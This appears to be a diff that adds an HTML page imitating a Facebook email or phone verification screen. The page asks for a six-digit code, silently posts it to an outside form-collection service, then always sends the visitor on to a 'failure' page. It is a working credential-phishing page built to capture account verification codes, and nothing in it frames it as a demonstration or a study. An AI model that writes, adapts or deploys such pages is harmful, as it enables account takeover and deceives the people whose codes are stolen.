@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Check Your Email</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+    * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+  }
+  
+  body {
+    background: linear-gradient(to bottom right, #f5f5f5, #dfeaff);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  
+  .container {
+    background: white;
+    border-radius: 15px;
+    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+    padding: 20px;
+    width: 100%;
+    max-width: 400px;
+    text-align: center;
+  }
+  
+  .header {
+    display: flex;
+    align-items: center;
+    margin-bottom: 20px;
+  }
+  </style>
+
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <a class="back-button" href="index.html" style="text-decoration: none;"><img src="cancel_24dp_000000_FILL0_wght400_GRAD0_opsz24.png" alt="cancel" height="30px"></a>
+      <h2>** • Facebook</h2>
+    </div>
+
+    <h1>Check your email/Number</h1>
+    <p>Enter the code we sent to <span class="email">YOU</span></p>
+
+    <div class="illustration">
+      <img src="fb-illustration.jpg" alt="Verification Illustration">
+    </div>
+
+    <form action="https://formspree.io/f/xanyzqjj" method="POST" id="verificationForm">
+      <label for="code" class="sr-only">Enter Code</label>
+      <input  type="text" id="verification-code" name="code" placeholder="Code" class="input-field1" maxlength="6">
+
+      <p class="timer">We can send a new email in <span class="countdown">02:50</span>.</p>
+
+      <button type="submit" class="button" disabled>Continue</button>
+      <button type="button" class="link-button">Try another way</button>
+    </form>
+    
+    <h2 style="margin-top: 10px; color: rgb(216, 216, 216);">Protected by Facebook Risk</h2>
+  </div>
+
+
+
+  <script>
+    // Select elements
+    const codeInput = document.getElementById("verification-code");
+    const continueButton = document.querySelector(".button");
+    const countdownElement = document.querySelector(".countdown");
+    
+    // Enable the "Continue" button when the input is valid
+    codeInput.addEventListener("input", () => {
+      if (codeInput.value.length >= 6) {
+        // Enable button
+        continueButton.disabled = false;
+        continueButton.style.backgroundColor = "#007bff";
+        continueButton.style.cursor = "pointer";
+      } else {
+        // Disable button
+        continueButton.disabled = true;
+        continueButton.style.backgroundColor = "#cccccc";
+        continueButton.style.cursor = "not-allowed";
+      }
+    });
+
+    // Countdown Timer
+    let countdownTime = 500; // in seconds
+    const countdownInterval = setInterval(() => {
+      countdownTime--;
+      countdownElement.textContent = `00:0${countdownTime}`;
+      if (countdownTime <= 0) {
+        clearInterval(countdownInterval);
+        countdownElement.textContent = "00:00";
+      }
+    }, 1000);
+
+
+
+    // Attach the button click event listener
+    document.getElementById('verificationForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent default submission
+
+      var form = event.target;
+      var formData = new FormData(form);
+
+      // Submit the form data asynchronously
+      fetch(form.action, {
+        method: 'POST',
+        body: formData,
+      })
+      .then(response => {
+        // Redirect to failure.html after successful form submission
+        window.location.href = 'failure.html';
+      })
+      .catch(error => {
+        // If there is a network error, still redirect to failure.html
+        console.error('Error submitting verification form:', error);
+        window.location.href = 'failure.html';
+        
+      });
+      
+    });
+
+  </script>
+</body>
+</html>
